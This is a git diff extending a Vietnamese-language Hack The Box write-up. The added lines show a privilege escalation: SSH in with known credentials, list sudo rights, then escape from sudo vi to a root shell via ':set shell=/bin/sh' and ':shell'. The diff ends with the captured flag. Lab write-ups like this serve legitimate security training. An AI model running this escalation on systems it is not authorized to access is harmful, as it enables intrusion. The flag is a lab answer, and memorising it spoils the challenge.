@@ -70,5 +70,15 @@
 ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/49499894-6444-4431-82e2-e97c685c28f2)
 ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/85c4e920-dd0f-403f-9ce4-ea314001fb8b)
 - kết nối ssh đến user và pass đã có. 
+
 ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/a4ecc9d8-daad-4f01-98c5-4630a8b53d2a)
+
+- Chạy lệnh sudo -l (liệt kê quyền mà user đang có).
+- Chạy tiếp lệnh sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+- (https://gtfobins.github.io/gtfobins/vi/#sudo)
+- Nhập  :set shell=/bin/sh
+        :shell
+- Chạy lệnh whoami. Ta đã có quyền root.
+- ![image](https://github.com/Pminh21/HTB_writeup/assets/169346714/a4b3f164-04fa-487d-8f01-c91a2f12a502)
+- flag: dd6e058e814260bc70e9bbdef2715849
 
